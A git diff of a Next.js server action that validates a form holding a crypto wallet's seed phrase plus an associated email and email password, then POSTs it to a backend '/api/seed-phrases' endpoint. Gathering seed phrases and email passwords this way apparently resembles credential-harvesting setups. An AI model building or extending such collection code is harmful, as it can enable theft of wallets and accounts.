@@ -1,14 +1,16 @@
+
 'use server';
 
 import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
 import type { SeedPhraseFormData } from '@/lib/definitions';
 import { cookies } from 'next/headers'; // Import cookies to get the auth token
+import { revalidatePath } from 'next/cache'; // Import revalidatePath
 
 // Base URL for your backend API
 const BACKEND_API_URL = process.env.NEXT_PUBLIC_BACKEND_API_URL || 'http://localhost:3001';
 
 export async function saveSeedPhraseAction(
-  formData: Omit<SeedPhraseFormData, 'email' | 'emailPassword'> // Form no longer submits user email/pass
+  formData: SeedPhraseFormData // Use the full form data type again
 ): Promise<{ success: boolean; error?: string }> {
 
   // 1. Get Auth Token
@@ -20,19 +22,9 @@ export async function saveSeedPhraseAction(
       return { success: false, error: 'Authentication required. Please log in.' };
   }
 
-  // 2. Validate the incoming form data (excluding user email/password which are handled by auth)
-  // We still validate walletName, seedPhrase, walletType etc.
-  // Need a slightly modified schema or just validate the relevant parts
-   const { email, emailPassword, ...walletData } = formData; // Separate wallet-specific data
-   const validatedFields = seedPhraseFormSchema.partial().pick({
-       walletName: true,
-       seedPhrase: true,
-       walletType: true,
-       // Adding email/emailPassword related to the *wallet/service*, not the *user*
-       email: true,
-       emailPassword: true,
-   }).safeParse(formData); // Parse the original formData containing wallet email/pass
-
+  // 2. Validate the incoming form data
+  // The schema includes walletName, seedPhrase, walletType, email, emailPassword
+   const validatedFields = seedPhraseFormSchema.safeParse(formData);
 
   if (!validatedFields.success) {
     console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
@@ -48,6 +40,7 @@ export async function saveSeedPhraseAction(
 
   // 3. Call the backend API to save the information
   try {
+    // Updated API endpoint for saving seed phrases
     const response = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
       method: 'POST',
       headers: {
@@ -59,6 +52,9 @@ export async function saveSeedPhraseAction(
 
     if (response.ok) {
         console.log('[Save Seed Action] Backend save successful.');
+         // Revalidate the dashboard path to show the newly added phrase
+         revalidatePath('/dashboard');
+         console.log('[Save Seed Action] Revalidated /dashboard path.');
         return { success: true };
     } else if (response.status === 401 || response.status === 403) {
         console.error('[Save Seed Action] Authentication/Authorization error from backend.');
@@ -70,6 +66,10 @@ export async function saveSeedPhraseAction(
       try {
           const errorData = await response.json();
           errorMessage = errorData.message || errorMessage;
+          // Handle validation errors from backend specifically
+          if (errorData.errors && Array.isArray(errorData.errors)) {
+              errorMessage = errorData.errors.join(' '); // Combine multiple validation errors
+          }
            console.error('[Save Seed Action] Backend save failed:', errorMessage);
       } catch (e) {
            console.error('[Save Seed Action] Backend save failed, could not parse error response:', response.statusText);
